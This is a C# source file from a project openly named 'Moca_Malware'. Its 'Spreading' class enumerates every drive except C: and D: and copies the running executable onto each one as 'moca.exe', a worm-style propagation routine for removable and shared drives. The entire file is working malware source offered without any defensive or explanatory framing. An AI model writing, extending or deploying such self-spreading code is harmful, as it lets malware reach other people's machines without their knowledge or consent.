using System;
using System.Collections;
using System.IO;
using System.Windows.Forms;

namespace Moca_Malware
{
    class Spreading
    {
        public static ArrayList getConnectedDevices()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            ArrayList connectedDevicesLetters = new ArrayList();
            try
            {
                foreach (DriveInfo device in allDrives)
                {
                    connectedDevicesLetters.Add(device.Name);
                }
            }
            catch (Exception ex)
            {
                ErrorHandler.errorRaised(ex);
            }
            connectedDevicesLetters.Remove("C:\\");
            connectedDevicesLetters.Remove("D:\\");
            return connectedDevicesLetters;
        }

        public static void attachToDevices()
        {
            try
            {
                foreach (string device in getConnectedDevices())
                {
                    if(!File.Exists(device + "\\moca.exe"))
                        File.Copy(ComputerInformations.getApplicationPath(), device + "\\moca.exe");
                    MessageBox.Show(device + "\\moca.exe");
                }
            }
            catch (Exception ex)
            {
                ErrorHandler.errorRaised(ex);
            }
        }

    }
}
